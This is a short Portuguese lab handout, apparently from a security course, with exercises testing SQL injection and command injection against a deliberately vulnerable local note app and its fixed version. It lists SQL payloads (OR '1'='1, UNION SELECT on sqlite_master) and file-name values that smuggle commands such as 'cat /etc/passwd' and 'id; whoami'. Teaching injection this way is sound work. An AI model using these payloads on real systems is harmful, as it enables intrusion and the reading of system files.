## Preparacao

```bash
python3 --version
mkdir -p ~/ssi-lab-inject
cd ~/ssi-lab-inject
cp /caminho/para/noteapp.py .
cp /caminho/para/noteapp_fixed.py .
```

## Executar a versao vulneravel

```bash
python3 noteapp.py
```

## Exercicio 1

Na opcao `1`, testar:

```text
Welcome
' OR '1'='1
' UNION SELECT 1, sql, '' FROM sqlite_master --
' UNION SELECT 1, title, body FROM notes --
```

## Exercicio 2

Na opcao `2`, escolher a nota `1` e testar:

```text
note.txt
note.txt; cat /etc/passwd
note.txt; id; whoami
`ls -la`
```

## Executar a versao corrigida

```bash
python3 noteapp_fixed.py
```

## Testar a correcao da SQL injection

Na opcao `1`, repetir:

```text
' OR '1'='1
' UNION SELECT 1, sql, '' FROM sqlite_master --
' UNION SELECT 1, title, body FROM notes --
```

## Testar a correcao da command injection

Na opcao `2`, repetir:

```text
note.txt
note.txt; cat /etc/passwd
note.txt; id; whoami
`ls -la`
```
